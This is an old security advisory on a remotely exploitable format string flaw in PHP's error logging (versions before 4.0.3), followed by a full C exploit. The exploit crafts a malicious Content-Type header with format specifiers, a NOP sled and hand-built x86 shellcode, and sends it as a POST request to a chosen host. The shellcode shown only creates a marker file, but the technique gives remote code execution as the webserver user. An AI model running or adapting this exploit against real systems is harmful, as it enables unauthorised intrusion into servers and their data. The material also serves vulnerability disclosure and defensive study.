source: http://www.securityfocus.com/bid/1786/info

PHP is a scripting language designed for CGI applications that is used on many websites. There exists a remotely exploitable format string vulnerability in all versions of PHP below PHP 4.0.3. 

The vulnerability exists in the code that handles error logging and is present if error logging is enabled in the "php.ini" configuration file. When errors are encountered by PHP, a string containing data supplied by the user is passed as the format string argument (the log_message variable) to the php_syslog() function (which contains *printf functions). As a result, it is possible for a malicious user to craft a string containing malicious format specifiers that will be passed to the php_syslog function as part of an error message. When interpreted by the *printf functions, these specifiers can cause the process to overwrite its own stack variables with arbitrary data. This can lead to remote access being gained on the target host with privileges of the webserver for the attacker.

Error logging may or may not be enabled by default on systems shipped with PHP.


#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<netdb.h>

#define BSIZE 1549
#define BUFFERZONE 128

int main(int argc, char *argv[])
{
  int i,start,count;
  int stackloc=0xBFFFDA60;
  int s;
  FILE *f;
  fd_set rfds;
  struct hostent *he;
  struct sockaddr_in saddr;
  char sploit[BSIZE];
  char file[]="/tmp/BADPHP";
  char c;

  if(argc!=5) {
    printf("%s <addr> <port> <offset> <php file name>\n",argv[0]);
    printf("offset=0 for most systems.\n"); 
    return 0;
  }

  /*** build exploit string ***/
  
  /* write bad format string, adding in offset */
  snprintf(sploit,sizeof(sploit),
	   "Content-Type:multipart/form-data %%%uX%%X%%X%%hn",
	   55817 /*+offset0,1,2,3*/ );

  /* fill with breakpoints and nops*/
  start=strlen(sploit);
  memset(sploit+start,0xCC,BSIZE-start);
  memset(sploit+start+BUFFERZONE*4,0x90,BUFFERZONE*4);
  sploit[BSIZE-1]=0;
  
  /* pointer to start of code (stackloc+4) */
  count=BUFFERZONE;
  for(i=0;i<count;i++) {
    unsigned int value=stackloc+4+(count*4);
    if((value&0x000000FF)==0) value|=0x00000004;
    if((value&0x0000FF00)==0) value|=0x00000400;
    if((value&0x00FF0000)==0) value|=0x00040000;
    if((value&0xFF000000)==0) value|=0x04000000;
    *(unsigned int *)&(sploit[start+i*4])=value;
  }
  start+=BUFFERZONE*4*2;

  /*** build shellcode ***/

  sploit[start+0]=0x90; /* nop */
  
  sploit[start+1]=0xBA; /* mov edx, (not 0x1B6 (a+rw)) */
  sploit[start+2]=0x49;
  sploit[start+3]=0xFE;
  sploit[start+4]=0xFF;
  sploit[start+5]=0xFF;

  sploit[start+6]=0xF7; /* not edx */
  sploit[start+7]=0xD2;

  sploit[start+8]=0xB9; /* mov ecx, (not 0x40 (O_CREAT)) */
  sploit[start+9]=0xBF;
  sploit[start+10]=0xFF;
  sploit[start+11]=0xFF;
  sploit[start+12]=0xFF;
  
  sploit[start+13]=0xF7; /* not ecx */
  sploit[start+14]=0xD1;
  
  sploit[start+15]=0xE8; /* call eip+4 + inc eax (overlapping) */
  sploit[start+16]=0xFF; 
  sploit[start+17]=0xFF; 
  sploit[start+18]=0xFF; 
  sploit[start+19]=0xFF; 
  sploit[start+20]=0xC0;
  sploit[start+21]=0x5B; /* pop ebx */
  sploit[start+22]=0x6A; /* push 22 (offset to end of sploit (filename)) */
  sploit[start+23]=0x16;
  sploit[start+24]=0x58; /* pop eax */
  sploit[start+25]=0x03; /* add ebx,eax */
  sploit[start+26]=0xD8;
  
  sploit[start+27]=0x33; /* xor eax,eax */
  sploit[start+28]=0xC0;

  sploit[start+29]=0x88; /* mov byte ptr [ebx+11],al */
  sploit[start+30]=0x43;
  sploit[start+31]=0x0B;
 
  sploit[start+32]=0x83; /* add eax,5 */
  sploit[start+33]=0xC0;
  sploit[start+34]=0x05;

  sploit[start+35]=0xCD; /* int 80 (open) */
  sploit[start+36]=0x80;

  sploit[start+37]=0x33; /* xor eax,eax */
  sploit[start+38]=0xC0;
 
  sploit[start+39]=0x40; /* inc eax */
  
  sploit[start+40]=0xCD; /* int 80 (_exit) */
  sploit[start+41]=0x80;
  
  /* add filename to touch */
  strncpy(&sploit[start+42],file,strlen(file));

  /*** send exploit string ***/
 
  /* create socket */
  s=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
  if(s<0) {
    printf("couldn't create socket.\n");
    return 0;
  } 
 
  /* connect to port */
  memset(&saddr,0,sizeof(saddr));
  saddr.sin_family=AF_INET;
  saddr.sin_port=htons(atoi(argv[2]));
  he=gethostbyname(argv[1]);
  if(he==NULL) {
    printf("invalid hostname.\n");
  }
  memcpy(&(saddr.sin_addr.s_addr),he->h_addr_list[0],sizeof(struct in_addr));

  if(connect(s,(struct sockaddr *)&saddr,sizeof(saddr))!=0) {
    printf("couldn't connect.\n");
    return 0;
  }
  
  /* fdopen the socket to use stream functions */
  f=fdopen(s,"w");
  if(f==NULL) {
    close(s);
    printf("couldn't fdopen socket.\n");
    return 0;
  }

  /* put the post request to the socket */
  fprintf(f,"POST %s HTTP/1.0\n",argv[4]);
  fputs(sploit,f);
  fputc('\n',f);
  fputc('\n',f);
  fflush(f);

  /* close the socket */
  fclose(f);
  close(s);

  return 0;
}




